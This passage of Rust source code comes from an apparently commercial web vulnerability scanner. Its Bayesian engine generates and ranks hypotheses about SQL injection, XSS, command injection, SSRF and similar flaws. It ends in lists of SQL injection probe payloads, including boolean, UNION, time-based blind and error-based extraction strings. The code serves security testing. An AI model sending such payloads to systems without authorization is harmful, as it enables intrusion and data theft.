// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

//! Hypothesis Engine - Bayesian-guided vulnerability testing
//!
//! Instead of blindly trying payloads, this engine forms hypotheses about
//! what vulnerabilities might exist and tests them systematically.
//!
//! The engine uses Bayesian reasoning to:
//! 1. Generate hypotheses from initial observations (parameter names, response patterns)
//! 2. Update confidence based on test results using Bayes' theorem
//! 3. Prioritize tests by information gain (entropy reduction)
//! 4. Chain hypotheses for multi-step vulnerability discovery

use std::collections::HashMap;
use tracing::{debug, info};

/// A hypothesis about a potential vulnerability
#[derive(Debug, Clone)]
pub struct Hypothesis {
    /// Unique identifier for this hypothesis
    pub id: String,
    /// Type of vulnerability being hypothesized
    pub hypothesis_type: HypothesisType,
    /// Target URL or parameter
    pub target: String,
    /// Initial belief probability (0.0-1.0)
    pub prior_probability: f32,
    /// Updated belief after evidence (0.0-1.0)
    pub posterior_probability: f32,
    /// Evidence collected for this hypothesis
    pub evidence: Vec<Evidence>,
    /// Tests suggested to gather more evidence
    pub suggested_tests: Vec<SuggestedTest>,
    /// Current status of the hypothesis
    pub status: HypothesisStatus,
    /// Parent hypothesis ID if this is a refinement
    pub parent_hypothesis: Option<String>,
    /// Child hypothesis IDs (refinements)
    pub child_hypotheses: Vec<String>,
}

/// Types of vulnerabilities we can hypothesize about
#[derive(Debug, Clone, PartialEq)]
pub enum HypothesisType {
    SqlInjection { db_type: Option<DbType> },
    XssReflected { context: Option<XssContext> },
    XssStored { context: Option<XssContext> },
    CommandInjection { os_type: Option<OsType> },
    PathTraversal { base_path: Option<String> },
    Ssrf { target_type: Option<SsrfTarget> },
    AuthBypass { auth_type: Option<String> },
    Idor { id_pattern: Option<String> },
    BusinessLogic { flow_type: Option<String> },
    TemplateInjection { engine: Option<String> },
    Deserialization { format: Option<String> },
    XxeInjection,
    LdapInjection,
    NoSqlInjection { db_type: Option<NoSqlDbType> },
}

impl HypothesisType {
    /// Get a human-readable name for this hypothesis type
    pub fn name(&self) -> &'static str {
        match self {
            HypothesisType::SqlInjection { .. } => "SQL Injection",
            HypothesisType::XssReflected { .. } => "Reflected XSS",
            HypothesisType::XssStored { .. } => "Stored XSS",
            HypothesisType::CommandInjection { .. } => "Command Injection",
            HypothesisType::PathTraversal { .. } => "Path Traversal",
            HypothesisType::Ssrf { .. } => "Server-Side Request Forgery",
            HypothesisType::AuthBypass { .. } => "Authentication Bypass",
            HypothesisType::Idor { .. } => "Insecure Direct Object Reference",
            HypothesisType::BusinessLogic { .. } => "Business Logic Flaw",
            HypothesisType::TemplateInjection { .. } => "Template Injection",
            HypothesisType::Deserialization { .. } => "Insecure Deserialization",
            HypothesisType::XxeInjection => "XML External Entity Injection",
            HypothesisType::LdapInjection => "LDAP Injection",
            HypothesisType::NoSqlInjection { .. } => "NoSQL Injection",
        }
    }
}

/// Database types for SQL injection hypothesis refinement
#[derive(Debug, Clone, PartialEq)]
pub enum DbType {
    MySQL,
    PostgreSQL,
    MSSQL,
    Oracle,
    SQLite,
    Unknown,
}

/// NoSQL database types
#[derive(Debug, Clone, PartialEq)]
pub enum NoSqlDbType {
    MongoDB,
    CouchDB,
    Redis,
    Unknown,
}

/// XSS context for payload selection
#[derive(Debug, Clone, PartialEq)]
pub enum XssContext {
    /// Inside HTML body
    Html,
    /// Inside an HTML attribute
    Attribute,
    /// Inside JavaScript code
    JavaScript,
    /// Inside a URL/href
    Url,
    /// Inside CSS
    Css,
}

/// Operating system types for command injection
#[derive(Debug, Clone, PartialEq)]
pub enum OsType {
    Linux,
    Windows,
    Unknown,
}

/// SSRF target types
#[derive(Debug, Clone, PartialEq)]
pub enum SsrfTarget {
    /// Internal network resources
    Internal,
    /// Cloud metadata endpoints
    Cloud,
    /// Localhost services
    Localhost,
    /// External callback
    External,
}

/// Status of a hypothesis
#[derive(Debug, Clone, PartialEq)]
pub enum HypothesisStatus {
    /// Hypothesis is being actively tested
    Active,
    /// Vulnerability confirmed
    Confirmed,
    /// Hypothesis rejected (not vulnerable)
    Rejected,
    /// Need more evidence to decide
    NeedsMoreData,
    /// Hypothesis refined into more specific hypotheses
    Refined,
}

/// Evidence that updates hypothesis probability
#[derive(Debug, Clone)]
pub struct Evidence {
    /// Type of evidence observed
    pub evidence_type: EvidenceType,
    /// Description of what was observed
    pub observation: String,
    /// Likelihood ratio: P(evidence|vuln) / P(evidence|no_vuln)
    pub likelihood_ratio: f32,
    /// When this evidence was collected
    pub timestamp: chrono::DateTime<chrono::Utc>,
    /// The test that produced this evidence
    pub test_payload: Option<String>,
}

impl Evidence {
    /// Create new evidence with current timestamp
    pub fn new(evidence_type: EvidenceType, observation: String, likelihood_ratio: f32) -> Self {
        Self {
            evidence_type,
            observation,
            likelihood_ratio,
            timestamp: chrono::Utc::now(),
            test_payload: None,
        }
    }

    /// Create evidence with associated test payload
    pub fn with_payload(mut self, payload: &str) -> Self {
        self.test_payload = Some(payload.to_string());
        self
    }
}

/// Types of evidence that can update hypothesis probability
#[derive(Debug, Clone, PartialEq)]
pub enum EvidenceType {
    /// Database or application error message
    ErrorMessage,
    /// Response time anomaly (potential blind injection)
    TimingAnomaly,
    /// Input reflected in response
    ContentReflection,
    /// HTTP status code changed
    StatusCodeChange,
    /// Response headers changed
    HeaderChange,
    /// Application behavior changed
    BehaviorChange,
    /// Application is sensitive to syntax characters
    SyntaxSensitivity,
    /// Stack trace or debug info exposed
    StackTrace,
    /// Path or file information disclosed
    PathDisclosure,
    /// Different response length
    LengthAnomaly,
    /// WAF or security filter detected
    WafDetected,
    /// Input sanitized or filtered
    InputFiltered,
    /// Successful exploitation confirmed
    ExploitSuccess,
}

/// A suggested test to gather more evidence
#[derive(Debug, Clone)]
pub struct SuggestedTest {
    /// Payload to send
    pub payload: String,
    /// Type of evidence we expect if vulnerable
    pub expected_evidence: EvidenceType,
    /// Information gain (entropy reduction) if test succeeds
    pub information_gain: f32,
    /// Description of what this test is checking
    pub description: String,
    /// Priority score (higher = test first)
    pub priority: f32,
}

impl SuggestedTest {
    /// Create a new suggested test
    pub fn new(payload: &str, expected_evidence: EvidenceType, info_gain: f32) -> Self {
        Self {
            payload: payload.to_string(),
            expected_evidence,
            information_gain: info_gain,
            description: String::new(),
            priority: info_gain,
        }
    }

    /// Add description to the test
    pub fn with_description(mut self, desc: &str) -> Self {
        self.description = desc.to_string();
        self
    }

    /// Set custom priority
    pub fn with_priority(mut self, priority: f32) -> Self {
        self.priority = priority;
        self
    }
}

/// Context priors that affect hypothesis generation
#[derive(Debug, Default, Clone)]
pub struct ContextPriors {
    /// Parameter name suggests SQL (e.g., "id", "query", "select")
    pub has_sql_indicators: bool,
    /// Parameter name suggests file operations
    pub has_file_params: bool,
    /// Parameter name suggests URL handling
    pub has_url_params: bool,
    /// Parameter name suggests ID/reference
    pub has_id_params: bool,
    /// Detected web framework
    pub detected_framework: Option<String>,
    /// Detected WAF
    pub detected_waf: Option<String>,
    /// Response contains JSON
    pub is_json_response: bool,
    /// Response contains XML
    pub is_xml_response: bool,
    /// Endpoint appears to be an API
    pub is_api_endpoint: bool,
    /// Parameter appears to accept user input for search
    pub is_search_param: bool,
    /// Response timing baseline (ms)
    pub baseline_timing_ms: Option<u64>,
}

/// Hints from response analysis
#[derive(Debug, Default, Clone)]
pub struct ResponseHints {
    /// Response contains SQL keywords
    pub has_sql_keywords: bool,
    /// Response contains error messages
    pub has_error_messages: bool,
    /// Response contains stack trace
    pub has_stack_trace: bool,
    /// Response discloses file paths
    pub has_path_disclosure: bool,
    /// Input is reflected in response
    pub reflects_input: bool,
    /// Response time in milliseconds
    pub timing_ms: u64,
    /// HTTP status code
    pub status_code: Option<u16>,
    /// Response content type
    pub content_type: Option<String>,
    /// Response body length
    pub body_length: usize,
    /// Specific error patterns detected
    pub error_patterns: Vec<String>,
}

/// The main Hypothesis Engine for Bayesian-guided testing
pub struct HypothesisEngine {
    /// All hypotheses indexed by ID
    hypotheses: HashMap<String, Hypothesis>,
    /// Context priors affecting new hypothesis generation
    context_priors: ContextPriors,
    /// Counter for generating unique hypothesis IDs
    hypothesis_counter: u64,
    /// Confirmation threshold (probability above which we confirm)
    confirmation_threshold: f32,
    /// Rejection threshold (probability below which we reject)
    rejection_threshold: f32,
}

impl Default for HypothesisEngine {
    fn default() -> Self {
        Self::new()
    }
}

impl HypothesisEngine {
    /// Create a new hypothesis engine with default thresholds
    pub fn new() -> Self {
        Self {
            hypotheses: HashMap::new(),
            context_priors: ContextPriors::default(),
            hypothesis_counter: 0,
            confirmation_threshold: 0.85,
            rejection_threshold: 0.10,
        }
    }

    /// Create with custom confirmation/rejection thresholds
    pub fn with_thresholds(confirmation: f32, rejection: f32) -> Self {
        Self {
            hypotheses: HashMap::new(),
            context_priors: ContextPriors::default(),
            hypothesis_counter: 0,
            confirmation_threshold: confirmation.clamp(0.5, 0.99),
            rejection_threshold: rejection.clamp(0.01, 0.5),
        }
    }

    /// Generate a unique hypothesis ID
    fn next_id(&mut self) -> String {
        self.hypothesis_counter += 1;
        format!("hyp_{}", self.hypothesis_counter)
    }

    /// Calculate prior probability based on parameter name and context
    fn calculate_prior(&self, hypothesis_type: &HypothesisType, param_name: &str) -> f32 {
        let base_prior = 0.15; // Default prior for any vulnerability
        let param_lower = param_name.to_lowercase();

        let context_boost = match hypothesis_type {
            HypothesisType::SqlInjection { .. } => {
                let sql_indicators = [
                    "id", "query", "search", "select", "order", "sort", "filter", "where",
                ];
                if sql_indicators.iter().any(|s| param_lower.contains(s)) {
                    0.25
                } else if self.context_priors.has_sql_indicators {
                    0.15
                } else {
                    0.0
                }
            }
            HypothesisType::XssReflected { .. } | HypothesisType::XssStored { .. } => {
                let xss_indicators = [
                    "name", "message", "comment", "input", "text", "content", "title", "desc",
                ];
                if xss_indicators.iter().any(|s| param_lower.contains(s)) {
                    0.20
                } else {
                    0.0
                }
            }
            HypothesisType::PathTraversal { .. } => {
                let path_indicators = [
                    "file", "path", "dir", "folder", "doc", "page", "template", "include",
                ];
                if path_indicators.iter().any(|s| param_lower.contains(s))
                    || self.context_priors.has_file_params
                {
                    0.30
                } else {
                    0.0
                }
            }
            HypothesisType::Ssrf { .. } => {
                let url_indicators = [
                    "url", "uri", "link", "href", "src", "redirect", "callback", "webhook",
                ];
                if url_indicators.iter().any(|s| param_lower.contains(s))
                    || self.context_priors.has_url_params
                {
                    0.35
                } else {
                    0.0
                }
            }
            HypothesisType::CommandInjection { .. } => {
                let cmd_indicators = ["cmd", "exec", "command", "run", "shell", "ping", "host"];
                if cmd_indicators.iter().any(|s| param_lower.contains(s)) {
                    0.30
                } else {
                    0.05
                }
            }
            HypothesisType::Idor { .. } => {
                let id_indicators = [
                    "id", "uid", "user_id", "userid", "account", "profile", "order_id",
                ];
                if id_indicators.iter().any(|s| param_lower.contains(s))
                    || self.context_priors.has_id_params
                {
                    0.25
                } else {
                    0.0
                }
            }
            HypothesisType::TemplateInjection { .. } => {
                let template_indicators = ["template", "render", "view", "page", "layout"];
                if template_indicators.iter().any(|s| param_lower.contains(s)) {
                    0.20
                } else {
                    0.05
                }
            }
            HypothesisType::NoSqlInjection { .. } => {
                if self.context_priors.is_json_response || self.context_priors.is_api_endpoint {
                    0.20
                } else {
                    0.05
                }
            }
            HypothesisType::XxeInjection => {
                if self.context_priors.is_xml_response {
                    0.30
                } else {
                    0.02
                }
            }
            _ => 0.0,
        };

        // Apply WAF penalty
        let waf_penalty: f32 = if self.context_priors.detected_waf.is_some() {
            0.10
        } else {
            0.0
        };

        (base_prior + context_boost - waf_penalty).clamp(0.01_f32, 0.90_f32)
    }

    /// Generate hypotheses from observed parameter and response
    pub fn generate_hypotheses(
        &mut self,
        param_name: &str,
        param_value: &str,
        endpoint: &str,
        response_hints: &ResponseHints,
    ) -> Vec<Hypothesis> {
        let mut generated = Vec::new();

        // SQL Injection hypothesis
        let sqli_prior =
            self.calculate_prior(&HypothesisType::SqlInjection { db_type: None }, param_name);
        let sqli_boost = if response_hints.has_sql_keywords {
            0.15
        } else {
            0.0
        } + if response_hints.has_error_messages {
            0.10
        } else {
            0.0
        };

        let sqli_id = self.next_id();
        let mut sqli_hypothesis = Hypothesis {
            id: sqli_id.clone(),
            hypothesis_type: HypothesisType::SqlInjection { db_type: None },
            target: format!("{}?{}={}", endpoint, param_name, param_value),
            prior_probability: (sqli_prior + sqli_boost).clamp(0.01, 0.90),
            posterior_probability: (sqli_prior + sqli_boost).clamp(0.01, 0.90),
            evidence: Vec::new(),
            suggested_tests: Hypothesis::generate_sqli_tests(&None),
            status: HypothesisStatus::Active,
            parent_hypothesis: None,
            child_hypotheses: Vec::new(),
        };

        // Add evidence from response hints
        if response_hints.has_sql_keywords {
            sqli_hypothesis.evidence.push(Evidence::new(
                EvidenceType::ErrorMessage,
                "SQL keywords detected in response".to_string(),
                2.5,
            ));
        }

        self.hypotheses
            .insert(sqli_id.clone(), sqli_hypothesis.clone());
        generated.push(sqli_hypothesis);

        // XSS hypothesis
        if response_hints.reflects_input {
            let xss_prior =
                self.calculate_prior(&HypothesisType::XssReflected { context: None }, param_name);
            let xss_id = self.next_id();
            let xss_hypothesis = Hypothesis {
                id: xss_id.clone(),
                hypothesis_type: HypothesisType::XssReflected { context: None },
                target: format!("{}?{}={}", endpoint, param_name, param_value),
                prior_probability: (xss_prior + 0.20).clamp(0.01, 0.90), // Boost for reflection
                posterior_probability: (xss_prior + 0.20).clamp(0.01, 0.90),
                evidence: vec![Evidence::new(
                    EvidenceType::ContentReflection,
                    "Input reflected in response".to_string(),
                    3.0,
                )],
                suggested_tests: Hypothesis::generate_xss_tests(&None),
                status: HypothesisStatus::Active,
                parent_hypothesis: None,
                child_hypotheses: Vec::new(),
            };

            self.hypotheses
                .insert(xss_id.clone(), xss_hypothesis.clone());
            generated.push(xss_hypothesis);
        }

        // Command Injection hypothesis
        let cmd_prior = self.calculate_prior(
            &HypothesisType::CommandInjection { os_type: None },
            param_name,
        );
        if cmd_prior > 0.15 {
            let cmd_id = self.next_id();
            let cmd_hypothesis = Hypothesis {
                id: cmd_id.clone(),
                hypothesis_type: HypothesisType::CommandInjection { os_type: None },
                target: format!("{}?{}={}", endpoint, param_name, param_value),
                prior_probability: cmd_prior,
                posterior_probability: cmd_prior,
                evidence: Vec::new(),
                suggested_tests: Hypothesis::generate_cmdi_tests(&None),
                status: HypothesisStatus::Active,
                parent_hypothesis: None,
                child_hypotheses: Vec::new(),
            };

            self.hypotheses
                .insert(cmd_id.clone(), cmd_hypothesis.clone());
            generated.push(cmd_hypothesis);
        }

        // Path Traversal hypothesis
        let path_prior = self.calculate_prior(
            &HypothesisType::PathTraversal { base_path: None },
            param_name,
        );
        if path_prior > 0.15 || response_hints.has_path_disclosure {
            let path_id = self.next_id();
            let mut path_hypothesis = Hypothesis {
                id: path_id.clone(),
                hypothesis_type: HypothesisType::PathTraversal { base_path: None },
                target: format!("{}?{}={}", endpoint, param_name, param_value),
                prior_probability: path_prior,
                posterior_probability: path_prior,
                evidence: Vec::new(),
                suggested_tests: Hypothesis::generate_path_traversal_tests(&None),
                status: HypothesisStatus::Active,
                parent_hypothesis: None,
                child_hypotheses: Vec::new(),
            };

            if response_hints.has_path_disclosure {
                path_hypothesis.evidence.push(Evidence::new(
                    EvidenceType::PathDisclosure,
                    "File path disclosed in response".to_string(),
                    2.0,
                ));
                path_hypothesis.posterior_probability =
                    Self::bayesian_update_static(path_hypothesis.posterior_probability, 2.0);
            }

            self.hypotheses
                .insert(path_id.clone(), path_hypothesis.clone());
            generated.push(path_hypothesis);
        }

        // SSRF hypothesis
        let ssrf_prior =
            self.calculate_prior(&HypothesisType::Ssrf { target_type: None }, param_name);
        if ssrf_prior > 0.15 {
            let ssrf_id = self.next_id();
            let ssrf_hypothesis = Hypothesis {
                id: ssrf_id.clone(),
                hypothesis_type: HypothesisType::Ssrf { target_type: None },
                target: format!("{}?{}={}", endpoint, param_name, param_value),
                prior_probability: ssrf_prior,
                posterior_probability: ssrf_prior,
                evidence: Vec::new(),
                suggested_tests: Hypothesis::generate_ssrf_tests(&None),
                status: HypothesisStatus::Active,
                parent_hypothesis: None,
                child_hypotheses: Vec::new(),
            };

            self.hypotheses
                .insert(ssrf_id.clone(), ssrf_hypothesis.clone());
            generated.push(ssrf_hypothesis);
        }

        // Template Injection hypothesis
        let ssti_prior = self.calculate_prior(
            &HypothesisType::TemplateInjection { engine: None },
            param_name,
        );
        if ssti_prior > 0.10 || response_hints.reflects_input {
            let ssti_id = self.next_id();
            let ssti_hypothesis = Hypothesis {
                id: ssti_id.clone(),
                hypothesis_type: HypothesisType::TemplateInjection { engine: None },
                target: format!("{}?{}={}", endpoint, param_name, param_value),
                prior_probability: ssti_prior,
                posterior_probability: ssti_prior,
                evidence: Vec::new(),
                suggested_tests: Hypothesis::generate_ssti_tests(&None),
                status: HypothesisStatus::Active,
                parent_hypothesis: None,
                child_hypotheses: Vec::new(),
            };

            self.hypotheses
                .insert(ssti_id.clone(), ssti_hypothesis.clone());
            generated.push(ssti_hypothesis);
        }

        info!(
            "Generated {} hypotheses for parameter '{}' at {}",
            generated.len(),
            param_name,
            endpoint
        );

        generated
    }

    /// Perform Bayesian update: P(vuln|evidence) = P(evidence|vuln) * P(vuln) / P(evidence)
    /// Using likelihood ratio: new_prob = prior * LR / (prior * LR + (1 - prior))
    fn bayesian_update_static(prior: f32, likelihood_ratio: f32) -> f32 {
        let numerator = prior * likelihood_ratio;
        let denominator = prior * likelihood_ratio + (1.0 - prior);

        if denominator == 0.0 {
            prior
        } else {
            (numerator / denominator).clamp(0.001, 0.999)
        }
    }

    /// Update hypothesis with new evidence
    pub fn update_with_evidence(
        &mut self,
        hypothesis_id: &str,
        evidence: Evidence,
    ) -> Option<&Hypothesis> {
        // Extract values needed for Bayesian update before mutable borrow
        let (prior, likelihood_ratio) = {
            let hypothesis = self.hypotheses.get(hypothesis_id)?;
            (hypothesis.posterior_probability, evidence.likelihood_ratio)
        };

        // Perform Bayesian update
        let new_posterior = Self::bayesian_update_static(prior, likelihood_ratio);

        let hypothesis = self.hypotheses.get_mut(hypothesis_id)?;

        debug!(
            "Bayesian update for {}: {} -> {} (LR: {})",
            hypothesis_id, prior, new_posterior, likelihood_ratio
        );

        hypothesis.posterior_probability = new_posterior;
        hypothesis.evidence.push(evidence);

        // Get thresholds before borrowing hypothesis
        let confirmation_threshold = self.confirmation_threshold;
        let rejection_threshold = self.rejection_threshold;

        // Update status based on new probability
        if new_posterior >= confirmation_threshold {
            hypothesis.status = HypothesisStatus::Confirmed;
            info!(
                "Hypothesis {} CONFIRMED (p={:.2})",
                hypothesis_id, new_posterior
            );
        } else if new_posterior <= rejection_threshold {
            hypothesis.status = HypothesisStatus::Rejected;
            info!(
                "Hypothesis {} REJECTED (p={:.2})",
                hypothesis_id, new_posterior
            );
        } else if hypothesis.needs_more_data() {
            hypothesis.status = HypothesisStatus::NeedsMoreData;
        }

        self.hypotheses.get(hypothesis_id)
    }

    /// Get the most promising hypothesis to test next (highest expected information gain)
    pub fn get_best_hypothesis(&self) -> Option<&Hypothesis> {
        self.hypotheses
            .values()
            .filter(|h| {
                h.status == HypothesisStatus::Active || h.status == HypothesisStatus::NeedsMoreData
            })
            .max_by(|a, b| {
                // Prioritize by expected information gain (entropy * probability)
                let a_score = a.entropy() * a.posterior_probability;
                let b_score = b.entropy() * b.posterior_probability;
                a_score
                    .partial_cmp(&b_score)
                    .unwrap_or(std::cmp::Ordering::Equal)
            })
    }

    /// Get suggested test for a hypothesis (highest information gain)
    pub fn get_next_test(&self, hypothesis_id: &str) -> Option<SuggestedTest> {
        let hypothesis = self.hypotheses.get(hypothesis_id)?;

        hypothesis
            .suggested_tests
            .iter()
            .max_by(|a, b| {
                a.priority
                    .partial_cmp(&b.priority)
                    .unwrap_or(std::cmp::Ordering::Equal)
            })
            .cloned()
    }

    /// Get all suggested tests sorted by priority
    pub fn get_all_tests(&self, hypothesis_id: &str) -> Vec<SuggestedTest> {
        if let Some(hypothesis) = self.hypotheses.get(hypothesis_id) {
            let mut tests = hypothesis.suggested_tests.clone();
            tests.sort_by(|a, b| {
                b.priority
                    .partial_cmp(&a.priority)
                    .unwrap_or(std::cmp::Ordering::Equal)
            });
            tests
        } else {
            Vec::new()
        }
    }

    /// Mark hypothesis as confirmed or rejected
    pub fn resolve_hypothesis(&mut self, hypothesis_id: &str, confirmed: bool) {
        if let Some(hypothesis) = self.hypotheses.get_mut(hypothesis_id) {
            if confirmed {
                hypothesis.status = HypothesisStatus::Confirmed;
                hypothesis.posterior_probability = 0.95;
                info!("Hypothesis {} manually CONFIRMED", hypothesis_id);
            } else {
                hypothesis.status = HypothesisStatus::Rejected;
                hypothesis.posterior_probability = 0.05;
                info!("Hypothesis {} manually REJECTED", hypothesis_id);
            }
        }
    }

    /// Update context priors (affects new hypothesis generation)
    pub fn update_context(&mut self, priors: ContextPriors) {
        self.context_priors = priors;
        debug!("Context priors updated: {:?}", self.context_priors);
    }

    /// Get all active hypotheses sorted by posterior probability
    pub fn get_active_hypotheses(&self) -> Vec<&Hypothesis> {
        let mut active: Vec<&Hypothesis> = self
            .hypotheses
            .values()
            .filter(|h| {
                h.status == HypothesisStatus::Active || h.status == HypothesisStatus::NeedsMoreData
            })
            .collect();

        active.sort_by(|a, b| {
            b.posterior_probability
                .partial_cmp(&a.posterior_probability)
                .unwrap_or(std::cmp::Ordering::Equal)
        });

        active
    }

    /// Get all confirmed hypotheses
    pub fn get_confirmed_hypotheses(&self) -> Vec<&Hypothesis> {
        self.hypotheses
            .values()
            .filter(|h| h.status == HypothesisStatus::Confirmed)
            .collect()
    }

    /// Get hypothesis by ID
    pub fn get_hypothesis(&self, hypothesis_id: &str) -> Option<&Hypothesis> {
        self.hypotheses.get(hypothesis_id)
    }

    /// Refine hypothesis into more specific hypotheses (e.g., SQLi -> MySQL SQLi)
    pub fn refine_hypothesis(&mut self, hypothesis_id: &str) -> Vec<String> {
        let hypothesis = match self.hypotheses.get(hypothesis_id) {
            Some(h) => h.clone(),
            None => return Vec::new(),
        };

        let mut child_ids = Vec::new();

        match &hypothesis.hypothesis_type {
            HypothesisType::SqlInjection { db_type: None } => {
                // Refine into specific database types
                let db_types = [
                    DbType::MySQL,
                    DbType::PostgreSQL,
                    DbType::MSSQL,
                    DbType::Oracle,
                    DbType::SQLite,
                ];

                for db in db_types {
                    let child_id = self.next_id();
                    let child = Hypothesis {
                        id: child_id.clone(),
                        hypothesis_type: HypothesisType::SqlInjection {
                            db_type: Some(db.clone()),
                        },
                        target: hypothesis.target.clone(),
                        prior_probability: hypothesis.posterior_probability * 0.3, // Distribute probability
                        posterior_probability: hypothesis.posterior_probability * 0.3,
                        evidence: hypothesis.evidence.clone(),
                        suggested_tests: Hypothesis::generate_sqli_tests(&Some(db)),
                        status: HypothesisStatus::Active,
                        parent_hypothesis: Some(hypothesis_id.to_string()),
                        child_hypotheses: Vec::new(),
                    };

                    self.hypotheses.insert(child_id.clone(), child);
                    child_ids.push(child_id);
                }
            }
            HypothesisType::XssReflected { context: None } => {
                // Refine into specific contexts
                let contexts = [
                    XssContext::Html,
                    XssContext::Attribute,
                    XssContext::JavaScript,
                    XssContext::Url,
                ];

                for ctx in contexts {
                    let child_id = self.next_id();
                    let child = Hypothesis {
                        id: child_id.clone(),
                        hypothesis_type: HypothesisType::XssReflected {
                            context: Some(ctx.clone()),
                        },
                        target: hypothesis.target.clone(),
                        prior_probability: hypothesis.posterior_probability * 0.3,
                        posterior_probability: hypothesis.posterior_probability * 0.3,
                        evidence: hypothesis.evidence.clone(),
                        suggested_tests: Hypothesis::generate_xss_tests(&Some(ctx)),
                        status: HypothesisStatus::Active,
                        parent_hypothesis: Some(hypothesis_id.to_string()),
                        child_hypotheses: Vec::new(),
                    };

                    self.hypotheses.insert(child_id.clone(), child);
                    child_ids.push(child_id);
                }
            }
            HypothesisType::CommandInjection { os_type: None } => {
                // Refine into OS types
                let os_types = [OsType::Linux, OsType::Windows];

                for os in os_types {
                    let child_id = self.next_id();
                    let child = Hypothesis {
                        id: child_id.clone(),
                        hypothesis_type: HypothesisType::CommandInjection {
                            os_type: Some(os.clone()),
                        },
                        target: hypothesis.target.clone(),
                        prior_probability: hypothesis.posterior_probability * 0.5,
                        posterior_probability: hypothesis.posterior_probability * 0.5,
                        evidence: hypothesis.evidence.clone(),
                        suggested_tests: Hypothesis::generate_cmdi_tests(&Some(os)),
                        status: HypothesisStatus::Active,
                        parent_hypothesis: Some(hypothesis_id.to_string()),
                        child_hypotheses: Vec::new(),
                    };

                    self.hypotheses.insert(child_id.clone(), child);
                    child_ids.push(child_id);
                }
            }
            _ => {}
        }

        // Update parent hypothesis
        if !child_ids.is_empty() {
            if let Some(parent) = self.hypotheses.get_mut(hypothesis_id) {
                parent.status = HypothesisStatus::Refined;
                parent.child_hypotheses = child_ids.clone();
            }
        }

        child_ids
    }

    /// Remove a hypothesis
    pub fn remove_hypothesis(&mut self, hypothesis_id: &str) -> Option<Hypothesis> {
        self.hypotheses.remove(hypothesis_id)
    }

    /// Clear all hypotheses
    pub fn clear(&mut self) {
        self.hypotheses.clear();
        self.hypothesis_counter = 0;
    }

    /// Get summary statistics
    pub fn get_stats(&self) -> HypothesisStats {
        let total = self.hypotheses.len();
        let active = self
            .hypotheses
            .values()
            .filter(|h| h.status == HypothesisStatus::Active)
            .count();
        let confirmed = self
            .hypotheses
            .values()
            .filter(|h| h.status == HypothesisStatus::Confirmed)
            .count();
        let rejected = self
            .hypotheses
            .values()
            .filter(|h| h.status == HypothesisStatus::Rejected)
            .count();
        let needs_data = self
            .hypotheses
            .values()
            .filter(|h| h.status == HypothesisStatus::NeedsMoreData)
            .count();

        let avg_posterior = if total > 0 {
            self.hypotheses
                .values()
                .map(|h| h.posterior_probability)
                .sum::<f32>()
                / total as f32
        } else {
            0.0
        };

        HypothesisStats {
            total,
            active,
            confirmed,
            rejected,
            needs_more_data: needs_data,
            average_posterior: avg_posterior,
        }
    }
}

/// Statistics about the hypothesis engine state
#[derive(Debug, Clone)]
pub struct HypothesisStats {
    pub total: usize,
    pub active: usize,
    pub confirmed: usize,
    pub rejected: usize,
    pub needs_more_data: usize,
    pub average_posterior: f32,
}

impl Hypothesis {
    /// Calculate entropy (uncertainty) for this hypothesis
    /// H(X) = -p*log2(p) - (1-p)*log2(1-p)
    /// Higher entropy = more uncertainty = needs more testing
    pub fn entropy(&self) -> f32 {
        let p = self.posterior_probability;

        if p <= 0.0 || p >= 1.0 {
            return 0.0;
        }

        let entropy = -p * p.log2() - (1.0 - p) * (1.0 - p).log2();
        entropy.max(0.0)
    }

    /// Check if hypothesis needs more evidence
    /// Returns true if probability is in the uncertain range (0.2 - 0.8)
    pub fn needs_more_data(&self) -> bool {
        self.posterior_probability > 0.15 && self.posterior_probability < 0.85
    }

    /// Calculate expected information gain from a test
    /// Higher gain = test result will significantly change our belief
    pub fn expected_information_gain(&self) -> f32 {
        // Information gain is highest when we're most uncertain
        self.entropy()
    }

    /// Generate SQL injection tests based on DB type hypothesis
    fn generate_sqli_tests(db_type: &Option<DbType>) -> Vec<SuggestedTest> {
        match db_type {
            None => {
                // Generic SQL injection tests
                vec![
                    SuggestedTest::new("'", EvidenceType::SyntaxSensitivity, 0.8)
                        .with_description("Single quote to detect SQL syntax errors"),
                    SuggestedTest::new("\"", EvidenceType::SyntaxSensitivity, 0.7)
                        .with_description("Double quote syntax test"),
                    SuggestedTest::new("' OR '1'='1", EvidenceType::BehaviorChange, 0.9)
                        .with_description("Boolean-based injection test"),
                    SuggestedTest::new("1' AND '1'='2", EvidenceType::BehaviorChange, 0.85)
                        .with_description("False condition injection test"),
                    SuggestedTest::new("' UNION SELECT NULL--", EvidenceType::ErrorMessage, 0.75)
                        .with_description("UNION-based injection probe"),
                    SuggestedTest::new(
                        "'; WAITFOR DELAY '0:0:5'--",
                        EvidenceType::TimingAnomaly,
                        0.95,
                    )
                    .with_description("Time-based blind injection (MSSQL)"),
                    SuggestedTest::new("' AND SLEEP(5)--", EvidenceType::TimingAnomaly, 0.95)
                        .with_description("Time-based blind injection (MySQL)"),
                ]
            }
            Some(DbType::MySQL) => {
                vec![
                    SuggestedTest::new("' AND SLEEP(5)--", EvidenceType::TimingAnomaly, 0.95)
                        .with_description("MySQL SLEEP function"),
                    SuggestedTest::new(
                        "' AND BENCHMARK(10000000,SHA1('test'))--",
                        EvidenceType::TimingAnomaly,
                        0.90,
                    )
                    .with_description("MySQL BENCHMARK function"),
                    SuggestedTest::new(
                        "' UNION SELECT @@version--",
                        EvidenceType::ContentReflection,
                        0.85,
                    )
                    .with_description("MySQL version extraction"),
                    SuggestedTest::new(
                        "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
                        EvidenceType::ErrorMessage,
                        0.80,
                    )
                    .with_description("MySQL error-based extraction"),
                ]
            }
            Some(DbType::PostgreSQL) => {
                vec![
                    SuggestedTest::new(
                        "'; SELECT PG_SLEEP(5)--",
                        EvidenceType::TimingAnomaly,
                        0.95,
                    )
                    .with_description("PostgreSQL PG_SLEEP function"),
                    SuggestedTest::new(
                        "' UNION SELECT version()--",
                        EvidenceType::ContentReflection,
                        0.85,
                    )
                    .with_description("PostgreSQL version extraction"),
                    SuggestedTest::new(
                        "'||(SELECT version())||'",
                        EvidenceType::ContentReflection,
                        0.80,
                    )
                    .with_description("PostgreSQL string concatenation injection"),
                ]
            }
            Some(DbType::MSSQL) => {
                vec![
                    SuggestedTest::new(
                        "'; WAITFOR DELAY '0:0:5'--",
                        EvidenceType::TimingAnomaly,
                        0.95,
                    )
                    .with_description("MSSQL WAITFOR DELAY"),
                    SuggestedTest::new(
                        "' UNION SELECT @@version--",
